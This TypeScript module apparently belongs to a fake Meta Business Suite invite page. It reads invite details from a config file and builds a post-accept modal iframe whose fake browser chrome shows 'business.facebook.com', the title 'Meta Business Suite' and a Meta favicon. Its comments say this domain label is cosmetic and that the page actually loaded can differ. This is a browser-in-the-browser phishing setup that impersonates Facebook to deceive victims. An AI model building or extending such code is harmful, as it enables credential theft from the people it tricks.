import config from "./config.json";
import type { InviteDetails } from "./types/invite";

// Helper function to replace placeholders in text
function replacePlaceholders(text: string, replacements: Record<string, string>): string {
  return text.replace(/\{(\w+)\}/g, (match, key) => replacements[key] || match);
}

// Transform config data into the expected format
export const INVITE: InviteDetails = {
  inviterName: config.invite.inviterName,
  businessName: config.invite.businessName,
  logoImageUrl: config.invite.logoImageUrl,
  createdDate: config.invite.createdDate,
  defaultEmail: config.invite.defaultEmail,
  isVerified: config.invite.isVerified,
};

export const PRIVACY_NOTES = config.privacy.notes.map(note => 
  replacePlaceholders(note, { businessName: INVITE.businessName })
);

export const PROFILE_INFO_DESCRIPTION = config.content.step2.profileInformation.description;

export const BUSINESS_VERIFICATION_INFO = config.businessVerificationInfo;

/** Actual page loaded in the post-accept modal iframe (can differ from `POST_ACCEPT_IFRAME` URL bar). */
export const POST_ACCEPT_IFRAME_LOAD_URL = `${config.postAcceptIframe.actualIframeUrl}`;

const postAcceptDisplayDefaults = {
  windowTitle: "Meta Business Suite",
  domainLabel: "business.facebook.com",
  faviconUrl: "/meta.png",
};

/** Chrome-only labels for the modal (domain/path are cosmetic; load URL is `POST_ACCEPT_IFRAME_LOAD_URL`). */
export const POST_ACCEPT_IFRAME = {
  ...postAcceptDisplayDefaults,
  ...config.postAcceptIframe,
};